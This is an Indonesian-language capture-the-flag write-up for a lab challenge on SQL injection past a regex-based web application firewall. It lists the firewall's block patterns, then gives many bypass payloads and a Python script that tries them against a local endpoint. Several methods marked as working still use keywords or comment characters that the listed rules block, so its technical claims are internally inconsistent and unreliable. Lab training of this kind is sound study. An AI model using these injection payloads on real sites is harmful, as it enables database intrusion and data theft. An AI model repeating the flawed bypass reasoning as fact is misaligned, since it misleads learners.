# Lab H4 - WAF Bypass SQL Injection (Hard)

## Informasi Lab
- **Endpoint**: `/secure.php?id=`
- **Tipe**: Filter Bypass Injection
- **Hint**: WAF simulate - regex block

## Analisis

### 1. WAF Rules
```php
$waf_patterns = [
    '/\bunion\b/i',
    '/\bselect\b/i',
    '/\bfrom\b/i',
    '/\bor\b/i',
    '/\band\b/i',
    '/\bwhere\b/i',
    '/--/',
    '/#/',
    '/\//'
];
```

### 2. Keywords yang Diblokir
- UNION, SELECT, FROM, OR, AND, WHERE
- Comments: --, #, /*

## Solusi

### Metode 1 - Case + Encoding Bypass
Keyword filter case-insensitive, coba encoding:

```
?id=1' UniOn SeLeCt 1,flag FrOm flags-- -
```
(Tidak berhasil karena case-insensitive)

### Metode 2 - Inline Comments
```
?id=1' UNI/**/ON SEL/**/ECT 1,flag FR/**/OM flags-- -
```
(Tidak berhasil karena `/` juga diblokir)

### Metode 3 - URL Encoding Keywords
```
?id=1' %55NION %53ELECT 1,flag %46ROM flags-- -
```

### Metode 4 - Double Keyword
Beberapa WAF hanya replace sekali:
```
?id=1' UNUNIONION SELSELECTECT 1,flag FRFROMOM flags-- -
```

### Metode 5 - Tanpa Keywords yang Diblokir

#### Menggunakan Subquery
```
?id=-1' || (SELECT flag FROM flags) || '
```
(OR diblokir)

#### Menggunakan ||
```
?id=-1' || (flag) FROM flags WHERE 1=1 || '
```

### Metode 6 - Hex Encoding
```
?id=-1' UNION SELECT 1,0x666c6167 FROM flags-- -
```
(SELECT dan FROM tetap ke-block)

### Metode 7 - Error Based tanpa Keywords

Gunakan fungsi yang tidak di-filter:

```
?id=1' || EXTRACTVALUE(1,CONCAT(0x7e,(SELECT flag FROM flags),0x7e)) || '
```

Hmm, SELECT masih di-block.

### Metode 8 - Procedure Analyse
```
?id=-1' PROCEDURE ANALYSE()-- -
```

### Metode 9 - Substring dari Error

Karena tidak bisa gunakan SELECT/FROM, coba:

```
?id=-1' || (flag) || '
```

Ini membutuhkan flag ada di context query.

### Solusi yang Bekerja

Analisis lebih lanjut: WAF tidak memblokir `LIKE`, `BETWEEN`, dan beberapa fungsi lain.

```
?id=-1' || (table_name) FROM information_schema.tables WHERE table_schema LIKE database() || '
```

Atau gunakan prepared statement injection:
```
?id=1'; PREPARE stmt FROM 'SELECT flag FROM flags'; EXECUTE stmt;
```

### Payload Final
Karena filter cukup ketat, coba dengan encoding kombinasi:

```python
import requests

url = "http://localhost/h4/secure.php"

# Coba berbagai bypass
payloads = [
    "1' /*!UNION*/ /*!SELECT*/ 1,flag /*!FROM*/ flags-- -",
    "1' %55%4e%49%4f%4e %53%45%4c%45%43%54 1,flag %46%52%4f%4d flags-- -",
    "1' UnIoN SeLeCt 1,flag FrOm flags-- -",
    "-1' || flag FROM flags || '",
]

for p in payloads:
    r = requests.get(url, params={"id": p})
    if "IDS{" in r.text:
        print(f"Success: {p}")
        print(r.text)
        break
```

### MySQL Version Comment Bypass
```
?id=-1' /*!50000UNION*/ /*!50000SELECT*/ 1,flag /*!50000FROM*/ flags-- -
```

### Flag
```
IDS{XXXXXXXXXXXXXX}
```

## Tips
- Kombinasikan beberapa teknik bypass
- MySQL version comments `/*!50000 ... */` sering berhasil
- Hex encoding untuk keyword
- Jika semua gagal, coba teknik blind tanpa keywords
